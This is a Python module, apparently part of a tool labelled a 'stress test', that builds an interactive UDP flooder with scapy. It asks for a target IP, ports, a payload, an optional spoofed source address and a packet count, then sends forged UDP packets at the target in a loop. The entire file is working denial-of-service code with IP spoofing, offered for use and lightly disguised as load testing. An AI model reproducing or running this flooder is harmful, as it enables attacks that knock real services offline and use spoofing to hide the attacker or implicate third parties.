import socket,random,scapy,random,Menus,Core
from scapy.all import *
from random import randrange
from colorama import init,Fore
init()



def UDPFlooderGen():
    Core.RemoveLine()
    ValidIP = False
    print(" ")
    try:
        while(ValidIP == False):
            Core.RemoveLine()
            TargetIP = input(str("Select Target IP > "))
            if(TargetIP.find(".") == -1):
                Core.RemoveLine()
                TargetIP = input(str("Select Target IP > "))
            else:
                ValidIP = True
                Core.RemoveLine()
                TargetIP = TargetIP
    except:
        ValidIP = False
        
    try:
        SourcePort = int(input(str("Source Port [8080] > ")))
    except:
        SourcePort = 8000

    try:
        Core.RemoveLine()
        TargetPort = int(input(str("Target Port [8090] > ")))
    except:
        TargetPort = 8001
    
    try:
        Core.RemoveLine()
        CustomPayload = str(input(str("Custom Payload > ")))
    except:
        CustomPayload = "Syanpse Stress Test"


    shouldspoof = False
    SpoofedIP = "N/A"
    
    Core.RemoveLine()
    ShouldSpoof = input(str("Would you like to spoof IP [No] > "))
    try:
        if(ShouldSpoof.find("y") !=-1):
            shouldspoof = 'True'
            
            try:
                ValidSpoof = False
                while(ValidSpoof == False):
                    Core.RemoveLine()
                    SpoofedIP = input(str("Input Spoofed IP > "))
                    if(SpoofedIP.find(".") == -1):
                        Core.RemoveLine()
                        SpoofedIP = input(str("Input Spoofed IP > "))
                    else:
                        ValidSpoof = True
                        
                        SpoofedIP = SpoofedIP
            except:
                SpoofedIP = "1.1.1.1"
                print("Except")
        else:
            shouldspoof = 'False'
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            SpoofedIP = s.getsockname()[0]
    except:
        shouldspoof = False
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        SpoofedIP = s.getsockname()[0]

    try:
        Core.RemoveLine()
        PacketsToSend = int(input(str("How many packets to send [1000] > ")))
    except:
        PacketsToSend = 1000
    
    if(SourcePort == None):
        SourcePort = 8080
    if(TargetPort == None):
        TargetPort = 8090
    Temp = str(shouldspoof)
    if(PacketsToSend == None):
        PacketsToSend == 1000

    RunUDPFlooder(TargetIP,SourcePort,TargetPort,SpoofedIP,PacketsToSend,CustomPayload)

    
def RunUDPFlooder(TargetIP, SourcePort, TargetPort, SpoofedIP, PacketsToSend,CustomPayload):
   


    try:
        Core.RemoveLine()
        i = 0
        print("Beginning Stress Test")
        while(i<PacketsToSend):
            i = i + 1
            send(IP(src=SpoofedIP,dst=TargetIP)/UDP(sport=int(SourcePort),dport=int(TargetPort))/CustomPayload,verbose=False)
            Core.RemoveLine()
            print('Sent ' + str(i) + '/' + str(PacketsToSend) + ' Packets')
            
            if(i == PacketsToSend):
                Core.RemoveLine()
                print(Fore.GREEN +"Finished")
                input(Fore.RESET + 'Press Enter to return to the main menu')
                Core.RemoveLine()
                break
    except:
        print("An Error Occured")

    Core.ReturnToMenu(Menus.StressMenu)

